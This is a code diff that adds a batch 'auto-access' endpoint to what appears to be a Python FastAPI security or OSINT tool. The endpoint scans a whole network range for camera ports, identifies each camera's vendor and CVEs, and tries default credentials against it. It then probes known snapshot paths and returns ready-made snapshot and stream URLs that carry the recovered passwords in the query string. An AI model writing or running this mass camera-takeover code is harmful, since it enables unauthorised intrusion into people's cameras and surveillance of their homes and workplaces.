@@ -1739,6 +1739,164 @@ async def iot_auto_access(ip: str = Query(...), port: int = Query(80)):
     }
 
 
+@app.post("/api/iot/auto-access-batch")
+async def iot_auto_access_batch(body: dict = Body(...)):
+    """Escanea una red CIDR y ejecuta auto-access en TODAS las cámaras encontradas.
+    Devuelve un resumen con vendor, CVEs, creds, snapshot y stream de cada cámara."""
+    import ipaddress as _ipa
+    import httpx
+
+    cidr = str(body.get("cidr", "192.168.1.0/24")).strip()
+    try:
+        net = _ipa.ip_network(cidr, strict=False)
+    except Exception:
+        return JSONResponse({"error": f"CIDR inválido: {cidr}"}, status_code=400)
+
+    hosts = [str(h) for h in net.hosts()]
+    SCAN_PORTS = [554, 80, 443, 8080, 8000, 37777, 8554]
+    CHUNK_SIZE = 64
+    SEM = asyncio.Semaphore(32)
+
+    async def check_ports(ip: str):
+        open_ports = []
+        for port in SCAN_PORTS:
+            async with SEM:
+                try:
+                    _, writer = await asyncio.wait_for(
+                        asyncio.open_connection(ip, port), timeout=1.0)
+                    writer.close()
+                    await writer.wait_closed()
+                    open_ports.append(port)
+                except Exception:
+                    pass
+        return ip, open_ports
+
+    # 1. Escanear red en chunks
+    scan_results = []
+    for chunk_start in range(0, len(hosts), CHUNK_SIZE):
+        chunk = hosts[chunk_start:chunk_start + CHUNK_SIZE]
+        tasks = [check_ports(ip) for ip in chunk]
+        chunk_results = await asyncio.gather(*tasks)
+        scan_results.extend(chunk_results)
+
+    # 2. Filtrar dispositivos con puertos de cámara abiertos
+    camera_hosts = [(ip, ports) for ip, ports in scan_results if ports]
+
+    if not camera_hosts:
+        return {
+            "cidr": cidr,
+            "hosts_scanned": len(hosts),
+            "cameras_found": 0,
+            "cameras": [],
+            "summary": {"total": 0, "full_access": 0, "partial_access": 0, "no_access": 0}
+        }
+
+    # 3. Para cada cámara, ejecutar auto-access en paralelo (máx 8 simultáneas)
+    CAMERA_SEM = asyncio.Semaphore(8)
+
+    async def process_camera(ip: str, ports: list):
+        async with CAMERA_SEM:
+            port = ports[0] if ports else 80
+            try:
+                vendor = _identify_camera_vendor(ip, port)
+                cves = VENDOR_CVES.get(vendor, [])
+                rtsp_paths = RTSP_PATHS_BY_VENDOR.get(vendor, RTSP_PATHS_BY_VENDOR["Generic"])
+
+                # Probar creds
+                creds_found = None
+                scheme = "https" if port in (443, 8443) else "http"
+                base_url = f"{scheme}://{ip}:{port}"
+
+                async with httpx.AsyncClient(timeout=6, verify=False) as c:
+                    if vendor != "unknown":
+                        for user, pwd in DEFAULT_CREDS:
+                            try:
+                                r = await c.get(base_url + "/", auth=(user, pwd), follow_redirects=True)
+                                if r.status_code == 200 and len(r.content) > 500:
+                                    if "401" not in r.text[:200] and "unauthorized" not in r.text[:200].lower():
+                                        creds_found = {"user": user, "pwd": pwd}
+                                        break
+                            except Exception:
+                                continue
+
+                    # Intentar snapshot
+                    snapshot_ok = False
+                    snapshot_path_used = None
+                    snap_size = 0
+
+                    snap_paths = [
+                        "/snapshot.cgi", "/cgi-bin/snapshot.cgi", "/image/jpeg.cgi",
+                        "/cgi-bin/viewer/video.jpg", "/tmpfs/auto.jpg",
+                        "/ISAPI/Streaming/channels/101/picture", "/onvif/snapshot",
+                        "/mjpg/snapshot.cgi", "/cgi-bin/view/snapshot.cgi", "/snapshot.jpg",
+                    ]
+                    auth = (creds_found["user"], creds_found["pwd"]) if creds_found else None
+
+                    for snap_path in snap_paths:
+                        try:
+                            url = base_url + snap_path
+                            r = await c.get(url, auth=auth, follow_redirects=True,
+                                            headers={"User-Agent": "SourceSeal-Batch/3.1"})
+                            ct = r.headers.get("Content-Type", "")
+                            if r.status_code == 200 and ("image" in ct or "octet-stream" in ct or len(r.content) > 1000):
+                                snapshot_ok = True
+                                snapshot_path_used = snap_path
+                                snap_size = len(r.content)
+                                break
+                        except Exception:
+                            continue
+
+                # URLs listos
+                snap_url = f"/api/iot/snapshot?ip={ip}&port={port}"
+                if creds_found:
+                    snap_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+                stream_path = rtsp_paths[0] if rtsp_paths else "/mjpg/video.mjpg"
+                stream_url = f"/api/iot/stream?ip={ip}&port={port}&path={urllib.parse.quote(stream_path, safe='')}"
+                if creds_found:
+                    stream_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+                access_level = "none"
+                if snapshot_ok:
+                    access_level = "full" if creds_found else "partial"
+                elif creds_found:
+                    access_level = "partial"
+
+                return {
+                    "ip": ip, "port": port, "ports_open": ports,
+                    "vendor": vendor, "cves": cves,
+                    "credentials": creds_found,
+                    "access_level": access_level,
+                    "snapshot": {"available": snapshot_ok, "path": snapshot_path_used, "size": snap_size, "url": snap_url if snapshot_ok else None},
+                    "stream_url": stream_url,
+                }
+            except Exception as e:
+                return {"ip": ip, "port": port, "ports_open": ports, "vendor": "unknown", "error": str(e)[:100],
+                        "access_level": "none", "snapshot": {"available": False}, "credentials": None}
+
+    # 4. Procesar todas las cámaras
+    camera_tasks = [process_camera(ip, ports) for ip, ports in camera_hosts]
+    camera_results = await asyncio.gather(*camera_tasks)
+
+    # 5. Resumen
+    summary = {
+        "total": len(camera_results),
+        "full_access": sum(1 for c in camera_results if c.get("access_level") == "full"),
+        "partial_access": sum(1 for c in camera_results if c.get("access_level") == "partial"),
+        "no_access": sum(1 for c in camera_results if c.get("access_level") == "none"),
+        "vendors_detected": list(set(c.get("vendor", "unknown") for c in camera_results if c.get("vendor") != "unknown")),
+        "total_cves": sum(len(c.get("cves", [])) for c in camera_results),
+    }
+
+    return {
+        "cidr": cidr,
+        "hosts_scanned": len(hosts),
+        "cameras_found": len(camera_results),
+        "cameras": sorted(camera_results, key=lambda c: {"full": 0, "partial": 1, "none": 2}.get(c.get("access_level", "none"), 3)),
+        "summary": summary,
+    }
+
+
 # ═════════════════════════════════════════════════════════════════════════════
 #  ENDPOINTS — OSINT
 # ═════════════════════════════════════════════════════════════════════════════
